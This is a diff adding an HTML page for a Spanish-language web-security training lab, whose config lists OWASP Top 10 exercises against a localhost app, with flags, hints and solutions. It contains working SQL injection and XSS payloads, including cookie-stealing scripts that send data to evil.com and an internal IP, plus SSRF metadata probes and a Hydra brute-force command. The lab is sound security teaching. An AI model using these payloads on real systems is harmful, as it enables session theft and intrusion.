@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🌍 Web Application Security — OWASP Top 10 — CyberDefense Labs</title>
+    <link rel="stylesheet" href="../../assets/css/lab-runner.css">
+</head>
+<body>
+    <div class="lab-page" id="lab-page"></div>
+
+    <script src="../../docs/assets/js/gamification.js"></script>
+    <script src="../../assets/js/lab-runner.js"></script>
+
+    <script>
+    const LAB_CONFIG = {
+        id: 'web-01',
+        name: 'Web Application Security',
+        subtitle: 'OWASP Top 10: A01 Broken Access, A03 Injection, A05 Misconfig, A07 XSS, A08 Deserialization',
+        icon: '🌍',
+        difficulty: 'intermedio',
+        totalXP: 400,
+        time: '90 min',
+        exercises: [
+            {
+                title: 'A01 — Broken Access Control',
+                xp: 50,
+                objective: 'Accede a panel de admin y recursos protegidos sin autenticación.',
+                steps: [
+                    'Intenta acceder directamente: <code>curl http://localhost:8080/admin</code>',
+                    'Prueba el API: <code>curl http://localhost:8080/api/admin/users</code>',
+                    'Enumera endpoints: <code>gobuster dir -u http://localhost:8080 -w common.txt</code>',
+                    'Busca archivos sensibles: <code>.env, .git, config.php</code>'
+                ],
+                code: `<span class="command">curl http://localhost:8080/admin</span>\n<span class="output">302 → redirect to /login</span>\n\n<span class="command">curl http://localhost:8080/admin/dashboard</span>\n<span class="flag">200 OK — Panel de admin accedido sin auth!</span>\n\n<span class="command">curl http://localhost:8080/api/admin/users</span>\n<span class="flag">[{"id":1,"user":"admin","role":"admin"}, ...]</span>\n\n<span class="comment"># El API no valida tokens — IDOR + Broken Access</span>`,
+                codeLang: 'bash',
+                flag: 'FLAG{a01_broken_access_admin}',
+                hint: 'La ruta /admin/redirige, pero /admin/dashboard no valida sesión.',
+                solution: '/admin/dashboard y /api/admin/users acceden sin autenticación. El API no valida tokens.'
+            },
+            {
+                title: 'A03 — SQL Injection',
+                xp: 50,
+                objective: 'Explota SQL Injection para extraer usuarios y contraseñas.',
+                steps: [
+                    'Prueba en campo de búsqueda: <code>\' OR \'1\'=\'1</code>',
+                    'Determina columnas: <code>\' ORDER BY 1--</code>, <code>\' ORDER BY 2--</code>',
+                    'UNION injection: <code>\' UNION SELECT null,null--</code>',
+                    'Extrae datos: <code>\' UNION SELECT username,password FROM users--</code>'
+                ],
+                code: `<span class="comment"># SQLi en login</span>\n<span class="flag">user: admin'--\npass: anything</span>\n<span class="output">→ Login bypass exitoso</span>\n\n<span class="comment"># SQLi en búsqueda</span>\n<span class="flag">' UNION SELECT username,password FROM users--</span>\n<span class="output">admin:admin123</span>\n<span class="output">user1:user123</span>\n<span class="output">editor:editor456</span>\n\n<span class="comment"># sqlmap</span>\n<span class="command">sqlmap -u "http://localhost:8080/search?id=1" --dbs --batch</span>`,
+                codeLang: 'bash',
+                flag: 'FLAG{a03_sqli_data_extracted}',
+                hint: 'El parámetro id de search no sanitiza input. UNION funciona.',
+                solution: 'admin\'-- bypassa login. UNION extrae 3 usuarios de la tabla users.'
+            },
+            {
+                title: 'A05 — Security Misconfiguration',
+                xp: 50,
+                objective: 'Encuentra archivos de configuración expuestos y servicios abiertos.',
+                steps: [
+                    'Busca .env: <code>curl http://localhost:8080/.env</code>',
+                    'Git expuesto: <code>curl http://localhost:8080/.git/config</code>',
+                    'PHP info: <code>curl http://localhost:8080/phpinfo.php</code>',
+                    'Server status: <code>curl http://localhost:8080/server-status</code>'
+                ],
+                code: `<span class="command">curl http://localhost:8080/.env</span>\n<span class="flag">DB_PASSWORD=insecure123</span>\n<span class="flag">AWS_KEY=AKIAIOSFODNN7EXAMPLE</span>\n<span class="flag">SECRET_KEY=mysecretkey123</span>\n\n<span class="command">curl http://localhost:8080/.git/config</span>\n<span class="flag">[remote "origin"]\n    url = git@github.com:corp/vulnerable-app.git</span>\n\n<span class="command">curl http://localhost:8080/phpinfo.php</span>\n<span class="flag">PHP Version 7.2.34 | expose_php = On</span>`,
+                codeLang: 'bash',
+                flag: 'FLAG{a05_misconfig_env_exposed}',
+                hint: '.git y .env nunca deben estar en producción.',
+                solution: '.env expone DB creds y AWS key. .git config expone repo. phpinfo expone config PHP.'
+            },
+            {
+                title: 'A07 — Cross-Site Scripting (XSS)',
+                xp: 50,
+                objective: 'Ejecuta XSS reflejado y almacenado para robar cookies.',
+                steps: [
+                    'Reflejado: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> en búsqueda',
+                    'Bypass filtro: <code>&lt;img src=x onerror=alert(1)&gt;</code>',
+                    'Almacenado: inserta payload en comentario/foro',
+                    'Roba cookie: <code>&lt;script&gt;fetch("http://evil.com?c="+document.cookie)&lt;/script&gt;</code>'
+                ],
+                code: `<span class="comment"># Reflected XSS</span>\nhttp://localhost:8080/search?q=<span class="flag">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span>\n\n<span class="comment"># Stored XSS en comentario</span>\n<span class="flag">&lt;script&gt;new Image().src="http://10.0.3.100:8080/steal?c="+document.cookie&lt;/script&gt;</span>\n\n<span class="comment"># DOM XSS</span>\n<span class="flag">&lt;img src=x onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly9ldmlsLmNvbS9jPScrZG9jdW1lbnQuY29va2ll'))"&gt;</span>`,
+                codeLang: 'html',
+                flag: 'FLAG{a07_xss_cookie_theft}',
+                hint: 'El parámetro q refleja directo. Stored XSS persiste en la BD.',
+                solution: 'Reflected: q refleja sin sanitizar. Stored: payload en comentarios persiste.'
+            },
+            {
+                title: 'A08 — Insecure Deserialization',
+                xp: 50,
+                objective: 'Manipula objetos serializados para escalar privilegios.',
+                steps: [
+                    'Captura cookie de sesión al hacer login',
+                    'Decodifica: <code>echo "Tzo..." | base64 -d</code>',
+                    'Modifica el campo role: guest → admin',
+                    'Re-codifica y reenvía la cookie'
+                ],
+                code: `<span class="comment"># Cookie original (Base64)</span>\n<span class="output">Tzo0OiJVc2VyIjoxOntzOjg6InVzZXJuYW1lIjtzOjU6ImFkbWluIjtzOjg6InJvbGVfam9iIjtzOjEwOiJndWVzdF91c2VyIn0=</span>\n\n<span class="comment"># Decodificar</span>\n<span class="flag">O:4:"User":1:{s:8:"username";s:5:"admin";s:8:"role_job";s:10:"guest_user";}</span>\n\n<span class="comment"># Modificar role_job</span>\n<span class="flag">O:4:"User":1:{s:8:"username";s:5:"admin";s:8:"role_job";s:10:"admin_user";}</span>\n\n<span class="comment"># Re-codificar en Base64 y usar como cookie</span>`,
+                codeLang: 'bash',
+                flag: 'FLAG{a08_deserialization_priv_esc}',
+                hint: 'El objeto PHP serializado tiene role_job: guest_user. Cámbialo a admin_user.',
+                solution: 'Cookie serializada en Base64. role_job: guest_user → admin_user = acceso admin.'
+            },
+            {
+                title: 'A10 — Server-Side Request Forgery (SSRF)',
+                xp: 50,
+                objective: 'Usa SSRF para escanear puertos internos y acceder a servicios.',
+                steps: [
+                    'Port scan interno: <code>/fetch?url=http://127.0.0.1:22</code>',
+                    'Accede a MySQL: <code>/fetch?url=http://127.0.0.1:3306</code>',
+                    'Accede a metadata: <code>/fetch?url=http://169.254.169.254/latest/meta-data/</code>',
+                    'Enumera servicios internos'
+                ],
+                code: `<span class="command">curl "http://localhost:8080/fetch?url=http://127.0.0.1:22"</span>\n<span class="flag">SSH-2.0-OpenSSH_8.4p1 Ubuntu</span>\n\n<span class="command">curl "http://localhost:8080/fetch?url=http://127.0.0.1:3306"</span>\n<span class="flag">5.7.36mysql_native_password</span>\n\n<span class="command">curl "http://localhost:8080/fetch?url=http://127.0.0.1:6379"</span>\n<span class="flag">+PONG (Redis expuesto!)</span>`,
+                codeLang: 'bash',
+                flag: 'FLAG{a10_ssrf_internal_scan}',
+                hint: 'fetch hace requests desde el servidor. Puedes escanear toda la red interna.',
+                solution: 'SSRF expone: SSH (22), MySQL (3306), Redis (6379). Redis sin auth = riesgo crítico.'
+            },
+            {
+                title: 'Fuerza Bruta contra Login',
+                xp: 50,
+                objective: 'Ejecuta fuerza bruta contra el formulario de login.',
+                steps: [
+                    'Usa Hydra: <code>hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"</code>',
+                    'O Burp Suite Intruder con wordlist',
+                    'Identifica el mensaje de error para el filtro',
+                    'Documenta credenciales encontradas'
+                ],
+                code: `<span class="command">hydra -l admin -P rockyou.txt localhost http-post-form \\\n  "/login:user=^USER^&pass=^PASS^:Invalid"</span>\n\n<span class="flag">[80][http-post-form] host: localhost   login: admin   password: admin123</span>\n\n<span class="comment"># Con Burp Intruder</span>\n<span class="output">Payload: rockyou.txt</span>\n<span class="output">Filter: Length != 1234 (diferente a "Invalid")</span>\n<span class="flag">→ admin:admin123</span>`,
+                codeLang: 'bash',
+                flag: 'FLAG{bruteforce_admin_found}',
+                hint: 'Filtra por longitud de respuesta diferente al mensaje de error.',
+                solution: 'Hydra crackea admin:admin123 en ~30 segundos con rockyou.txt.'
+            },
+            {
+                title: 'Defensa y Hardening',
+                xp: 50,
+                objective: 'Documenta mitigaciones para cada vulnerabilidad OWASP encontrada.',
+                steps: [
+                    'A01: Implementar RBAC y validación de sesión',
+                    'A03: Prepared statements y input validation',
+                    'A05: Eliminar archivos expuestos, deshabilitar debug',
+                    'A07: Content Security Policy y output encoding',
+                    'Crea informe con cada hallazgo y remediación'
+                ],
+                code: `<span class="comment"># Mitigaciones OWASP Top 10</span>\n\n<span class="flag">A01: RBAC + session validation middleware</span>\n<span class="flag">A03: Prepared statements + WAF</span>\n<span class="flag">A05: Remove .env, .git, phpinfo.php</span>\n<span class="flag">A07: CSP headers + output encoding</span>\n<span class="flag">A08: Signed cookies + HMAC validation</span>\n<span class="flag">A10: Whitelist URLs + disable internal access</span>\n\n<span class="comment"># Apache .htaccess</span>\nHeader always set X-Frame-Options "SAMEORIGIN"\nHeader always set Content-Security-Policy "default-src 'self'"`,
+                codeLang: 'markdown',
+                flag: 'FLAG{owasp_hardening_complete}',
+                hint: 'Cada vulnerabilidad OWASP tiene una mitigación específica documentada.',
+                solution: '6 vulnerabilidades mitigadas con preparación de statements, RBAC, CSP, HMAC y URL whitelist.'
+            }
+        ]
+    };
+
+    document.addEventListener('DOMContentLoaded', () => {
+        CDPN_LabRunner.init(LAB_CONFIG);
+    });
+    </script>
+</body>
+</html>
